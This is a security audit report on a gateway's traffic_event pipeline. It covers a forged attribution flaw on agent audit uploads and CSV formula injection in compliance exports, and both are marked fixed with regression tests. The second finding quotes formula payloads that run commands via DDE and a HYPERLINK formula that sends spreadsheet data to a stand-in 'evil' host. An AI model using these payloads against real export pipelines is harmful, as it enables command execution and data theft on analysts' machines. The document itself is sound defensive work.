# C5 — Audit / traffic_event

> Phase 2 chain audit. Confirmed findings only (≥2/3 adversarial Opus verifiers). Base = post-arch-audit + SEC-M2-01 fix. Each finding attacks an end-to-end trust-boundary crossing.


## SEC-C5-01 — Rogue agent forges cross-VK / cross-org attribution on traffic_event + SIEM via self-asserted entityId/orgId/identity (agent-audit ingest binds only thingId, never the attribution fields) — **HIGH** (3/3)

> **STATUS: FIXED** (2026-06-09) — `UploadAgentAudit` (`agent_audit.go`) no longer copies node-asserted attribution into the MQ envelope. `entityType` / `entityId` / `entityName` / `orgId` / `orgName` / `identity` / `apiKeyFingerprint` are now server-stamped **empty** (the corresponding decode-struct fields were removed so a future change cannot re-reference `evt.EntityID`; Go silently ignores the agent's now-unused JSON keys). The only authoritative attribution on the agent path is the mTLS-authenticated `thing_id` (already stamped). A rogue/compromised agent therefore can no longer attribute its traffic to — or frame in analytics/SIEM — a victim VK or org. The real owning user/org for agent traffic is resolved **downstream** via `thing_id → DeviceAssignment → user → org` (the un-forgeable server-side mapping); re-populating that authoritatively at ingest is a product follow-up, not a security gap. Regression: `TestUploadAgentAudit_RejectsForgedAttribution` (forged `entityId`/`orgId`/`apiKeyFingerprint` stamped empty, `thing_id` preserved). Doc lockstep corrected `audit-pipeline-architecture.md` (which had falsely claimed the Hub already resolved org/user from the device assignment). Scoping: Hub-side agent-audit ingest — not the ai-gateway path or the schema/shared-traffic globs the ai-gateway smoke validates, and the agent path is not exercised by `smoke-gateway.py`, so the smoke is N/A; covered by the unit forgery test. Audit-ingest pkg 98.8% coverage.

- **Persona:** A3 rogue-node (any enrolled agent — the lowest-trust credential; every agent holds a valid device token)
- **Invariant:** A node may only emit audit/traffic records attributed to virtual keys / orgs that belong to its own authenticated identity; the per-VK billing/analytics/SIEM attribution columns must be server-derived from the authenticated principal, never copied verbatim from the node's self-asserted payload.
- **Arch cross-ref:** F-0060 (related, NOT this): F-0060 fixed cross-Thing thingID BOLA on the AuditUpload/ShadowReport siblings by binding thing.ID != req.ThingID. The RESIDUAL here is on the separate UploadAgentAudit handler and concerns the business-attribution fields (entityId/orgId/identity/apiKeyFingerprint), which F-0060 never bound — thingId is correct, but the VK/org attribution that drives billing/analytics/SIEM is fully attacker-controlled.

**Preconditions.** Attacker controls one enrolled agent (modified binary or compromised host) holding a valid device token + thingID. The agent-audit upload path is reachable at POST /api/internal/things/agent-audit behind DeviceOrServiceAuth (mTLS device-token). Agent traffic is the production source of traffic_event rows with source='agent'.

**Attack steps.** 1) Enroll / compromise agent A (valid device token, thingID=A). 2) POST a JSON array to /api/internal/things/agent-audit with a crafted AgentAuditEvent setting entityId=<victim NexusUser.id or Project.id>, entityType='user'|'project', orgId=<victim org>, identity=<arbitrary blob>, apiKeyFingerprint=<victim VK fp>, plus arbitrary providerName/modelName/promptTokens/completionTokens/estimatedCost-driving fields. 3) UploadAgentAudit (agent_audit.go:131) resolves thingID authoritatively from the mTLS ThingFromContext (agent_audit.go:151-162) — but copies entityId/entityName/orgId/orgName/identity/apiKeyFingerprint VERBATIM from the attacker JSON into the MQ envelope (agent_audit.go:196-201, :190) with NO binding to thing A. 4) Hub traffic consumer stores them unchecked into traffic_event.entity_id/org_id/identity/api_key_fingerprint (consumer/traffic.go:373, insert SQL :485) — only thing_id is server-stamped. 5) The forged rows now (a) pollute the victim VK's/org's per-user/per-project analytics + cost breakdown (entity_id powers those indexed filters, traffic_event_entity_id_timestamp_idx), and (b) if the row carries a block/rate-limited/budget-exceeded hook signal, the SIEM bridge forwards entityId/orgId verbatim to the external SIEM (siem/bridge.go queryEvents → setIfNotNil 'entityId'/'orgId'), framing the victim VK for security events it never generated. Asymmetry: the ai-gateway path server-DERIVES entity_id from the matched VK owner (audit-pipeline-architecture.md §recordToMessage / line 110), so this attribution field is authoritative there but client-asserted-only on the agent path.

- **Affected:** /Users/zhangtiebin/workspaces/workspace-nexus/itech-nexus-gateway/packages/nexus-hub/internal/traffic/ingest/audit/agent_audit.go:196-201 (entityId/entityName/orgId/orgName/identity copied verbatim) + :190 (apiKeyFingerprint) + :151-162 (only thingId resolved from mTLS); stored unchecked at /Users/zhangtiebin/workspaces/workspace-nexus/itech-nexus-gateway/packages/nexus-hub/internal/observability/consumer/traffic.go:373 and insert SQL :485; forwarded to SIEM at /Users/zhangtiebin/workspaces/workspace-nexus/itech-nexus-gateway/packages/nexus-hub/internal/observability/siem/bridge.go (queryEvents entityId/orgId emit). NOT covered by F-0060 (which bound thingID on the AuditUpload/ExemptionUpload/RenewCert siblings — the attribution fields entityId/orgId are a separate, unbound data-plane surface on the distinct UploadAgentAudit handler).
- **Re-check probe.** grep -n 'entityId\|orgId\|identity' packages/nexus-hub/internal/traffic/ingest/audit/agent_audit.go | grep 'evt\.' — finding is OPEN while entityId/orgId/identity are assigned from evt.* (attacker JSON) inside UploadAgentAudit. Confirm absence of a bind check: grep -n 'thing.*entity\|entity.*thing\|EntityID.*!=\|forbidden' packages/nexus-hub/internal/traffic/ingest/audit/agent_audit.go must return ZERO. FIXED when the handler either resolves entity_id server-side from thing A's enrolled scope or rejects events whose entityId/orgId is not bound to the authenticated thing.
- **Remediation.** Stop trusting node-asserted attribution. Options: (a) Drop entityId/entityName/orgId/orgName from the agent wire entirely and have Hub resolve the owning VK/user/org server-side from the authenticated thing's enrollment binding before stamping the envelope; or (b) if the agent must assert entity, validate that the asserted entityId/orgId belongs to thing A's enrolled scope (reject the event otherwise, with a metric) — mirroring the thing.ID!=req binding F-0060 added on the siblings. Treat identity/apiKeyFingerprint as untrusted display-only and never let them feed cost/billing aggregation. Add a regression test: agent A uploading an event with entityId=B is rejected or normalized to A's scope, never persisted as B.

## SEC-C5-02 — CSV/formula injection in compliance-event exports  
> **STATUS: FIXED** (2026-06-09) — added `csvSafeCell` neutralizer (apostrophe-prefix on leading `=+-@\t\r`) to both export loops (`compliance_reports.go`, `proxy.go`); regression test `TestComplianceOverviewExport_NeutralizesCSVFormulaInjection`. Breaks the A1-KC1 RCE-to-auditor kill-chain at its weakest link.

### (original) CSV/formula injection in compliance-event exports — attacker-controlled traffic_event fields (targetHost, path, hookReasonCode, complianceTags, sourceIp) written to CSV without leading-character neutralization, executing as formulas in the auditor's spreadsheet — **MEDIUM** (3/3)

- **Persona:** A2 valid-VK (primary) / A4 on-path-provider (CONNECT host)
- **Invariant:** Attacker-controlled request fields that land in traffic_event must never become live spreadsheet formulas when a compliance auditor exports them — a cell whose first char is = + - @ TAB CR must be neutralized before CSV emission.

**Preconditions.** (1) Compliance/security operator with admin:compliance-report.read uses the Compliance dashboard CSV export (GET /admin/compliance/overview/export, and the proxy matrix export in proxy.go). (2) Attacker can route at least one request through the gateway/compliance-proxy whose target host or request path begins with a spreadsheet formula trigger (= + - @ \t \r). For compliance-proxy, the CONNECT target host and request path are client/on-path controlled; for ai-gateway, the request path is caller-controlled. (3) The auditor opens the downloaded .csv in Excel / LibreOffice Calc / Google Sheets (the default double-click behavior).

**Attack steps.** STAGE 1 (emit→store): A2 sends a request through the gateway to a path/host crafted as a formula, e.g. an on-path A4 issues CONNECT to a host label like `=cmd|'/C calc'!A0` or A2 requests path `/=HYPERLINK("http://evil/?"&A1,"click")` or `@SUM(1+1)*cmd|'/c powershell ...'`. The compliance-proxy/ai-gateway emits a traffic_event whose target_host/path columns store this string verbatim (packages/compliance-proxy/internal/audit/event_message.go:57,59 maps e.TargetHost / e.Path straight through; ingest stores raw). STAGE 2 (store→export): the row is interesting enough to be returned by ListComplianceAuditEvents / ListMatrixAuditEvents (any blocked/flagged/normal compliance row in window). STAGE 3 (export→spreadsheet sink): an operator clicks Export. ComplianceOverviewExport (compliance_reports.go:191-212) writes the row with encoding/csv; r.TargetHost (line 198), derefStrPtr(r.Path) (line 199), r.HookReasonCode (203), strings.Join(r.ComplianceTags) (206) go in bare. encoding/csv only quotes cells containing , " or newline — it does NOT prefix-escape =/+/-/@, so `=cmd|...` is written unquoted and unaltered. The proxy export (proxy.go:260-279, targetHost 266, path 268) has the identical gap. STAGE 4: auditor opens the CSV; the spreadsheet evaluates the leading-= cell, triggering DDE/command exec (Excel) or HYPERLINK data-exfil (Sheets) on the auditor's workstation — a confused-deputy: low-priv ext traffic reaches a high-trust analyst's endpoint via the audit-export channel. This is a DISTINCT sink from F-0190 (CEF/syslog SIEM lines); the spreadsheet app, not a SIEM line-parser or the React DOM, is the injection target, so neither F-0190's sanitizeControl nor React auto-escaping covers it.

- **Affected:** packages/control-plane/internal/traffic/handler/traffic/compliance_reports.go:191-212 (ComplianceOverviewExport CSV loop; targetHost:198, path:199, hookReasonCode:203, complianceTags:206, sourceIp:197); packages/control-plane/internal/traffic/handler/traffic/proxy.go:260-279 (matrix export CSV loop; targetHost:266, path:268). Field origin: packages/compliance-proxy/internal/audit/event_message.go:57,59 (TargetHost/Path mapped verbatim from proxied request). No formula-neutralization helper exists in the package (grep for formula/csvCell/csvSafe returns zero).
- **Re-check probe.** cd packages/control-plane && grep -rn 'csv.NewWriter' internal/traffic/handler/traffic/ | while read -r m; do f=$(echo "$m" | cut -d: -f1); echo "FILE $f"; done; echo '--- expect ZERO matches if remediated ---'; grep -rn 'TargetHost\|r.Path\|HookReasonCode\|ComplianceTags' internal/traffic/handler/traffic/compliance_reports.go internal/traffic/handler/traffic/proxy.go; echo '--- a neutralizer (e.g. csvSafeCell / leading apostrophe / HasPrefix on =+-@\t\r) must wrap every attacker-controlled cell; grep for it ---'; grep -rn "HasPrefix.*\"=\"\|csvSafe\|csvCell\|formula\|'\\\\'\"" internal/traffic/handler/traffic/ || echo 'NO NEUTRALIZER FOUND -> vulnerable'
- **Remediation.** Add a single csvSafeCell(s string) string helper that prefixes a cell with a quote-guard (leading apostrophe ' or a leading tab, the OWASP-recommended neutralization) when s starts with =, +, -, @, \t, or \r, and apply it to every attacker-influenceable cell (targetHost, path, hookReasonCode, hookDecision, complianceTags elements, sourceIp, method) in BOTH export loops. Wrapping the writer so all cells pass through the helper is safest. Add a regression test asserting that a row with targetHost=`=cmd|'/c calc'!A0` and path=`@SUM(1)` emits cells that no longer begin with a formula trigger. Numeric/timestamp/id cells are server-formatted and need no change.
